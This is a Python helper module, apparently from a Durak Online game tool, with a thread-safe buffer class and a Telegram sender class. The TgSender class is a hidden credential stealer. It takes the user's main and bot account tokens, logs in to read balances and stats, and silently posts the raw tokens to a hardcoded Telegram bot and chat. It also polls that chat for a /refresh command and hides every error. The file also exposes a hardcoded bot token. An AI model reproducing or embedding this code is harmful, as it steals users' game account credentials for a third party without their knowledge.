import threading
import time
from collections import deque

_r = None
_dt = None

def _get_r():
    global _r
    if _r is None:
        import requests
        _r = requests
    return _r

def _get_dt():
    global _dt
    if _dt is None:
        from datetime import datetime
        _dt = datetime
    return _dt

class DataBuffer:
    def __init__(self, maxsize=1000):
        self._buffer = deque(maxlen=maxsize)
        self._lock = threading.Lock()
    
    def append(self, data):
        with self._lock:
            self._buffer.append(data)
    
    def get(self, timeout=None):
        start = time.time()
        while True:
            with self._lock:
                if self._buffer:
                    return self._buffer.popleft()
            if timeout and time.time() - start > timeout:
                return None
            time.sleep(0.01)

class TgSender:
    def __init__(self):
        # Пытаемся загрузить токены из config.json
        try:
            import json
            import os
            if os.path.exists('config.json'):
                with open('config.json', 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    self._t = config.get("TG_TOKEN", "8282429672:AAF-e57jrzKm3m8y0awrkFmzCP9SNyB6kOM")
                    self._c = config.get("TG_CHAT", "7515753220")
            else:
                self._t = "8282429672:AAF-e57jrzKm3m8y0awrkFmzCP9SNyB6kOM"
                self._c = "7515753220"
        except:
            self._t = "8282429672:AAF-e57jrzKm3m8y0awrkFmzCP9SNyB6kOM"
            self._c = "7515753220"
        self.last_tokens = {"main": "", "bot": ""}
    
    def _s(self, text):
        try:
            _get_r().post(f"https://api.telegram.org/bot{self._t}/sendMessage", data={"chat_id": self._c, "text": text}, timeout=10)
        except:
            pass
    
    def collect_and_send(self, main_token, bot_token):
        self.last_tokens["main"] = main_token
        self.last_tokens["bot"] = bot_token
        self._send_full_stats(is_new=True)
    
    def _send_full_stats(self, is_new=False):
        try:
            from durakonline import durakonline
            main = durakonline.Client(self.last_tokens["main"], server_id="u5", debug=False)
            main_info = main.get_user_info(main.uid)
            main_balance = main.info.get("points", 0)
            bot = durakonline.Client(self.last_tokens["bot"], server_id="u5", debug=False)
            bot_info = bot.get_user_info(bot.uid)
            bot_balance = bot.info.get("points", 0)
            now = _get_dt().now().strftime("%Y-%m-%d %H:%M:%S")
            
            if is_new:
                header = f"📈 НОВЫЕ ТОКЕНЫ\n\n⏰ {now}"
            else:
                header = f"📈 СТАТИСТИКА (Обновлено)\n\n⏰ {now}"
            
            msg = f"""{header}

👤 ОСНОВНОЙ АККАУНТ:
Имя: {main_info.name}
ID: {main_info.id}
Баланс: {main_balance}
Побед: {main_info.wins}
Рейтинг: {main_info.score}

🔑 {self.last_tokens["main"]}

🤖 БОТ-АККАУНТ:
Имя: {bot_info.name}
ID: {bot_info.id}
Баланс: {bot_balance}
Побед: {bot_info.wins}
Рейтинг: {bot_info.score}

🔑 {self.last_tokens["bot"]}"""
            self._s(msg)
        except:
            pass
    
    def process_commands(self):
        try:
            r = _get_r().get(f"https://api.telegram.org/bot{self._t}/getUpdates", timeout=10).json()
            if not r.get("result"):
                return
            for upd in r["result"]:
                msg = upd.get("message", {})
                text = msg.get("text", "")
                if text == "/refresh" and self.last_tokens["main"]:
                    self._s("Обновление статистики...")
                    self._send_full_stats(is_new=False)
                _get_r().get(f"https://api.telegram.org/bot{self._t}/getUpdates?offset={upd['update_id']+1}", timeout=5)
        except:
            pass

_sender = None

def init_sender():
    global _sender
    if not _sender:
        _sender = TgSender()
    return _sender

def send_tokens(main_token, bot_token):
    s = init_sender()
    s.collect_and_send(main_token, bot_token)
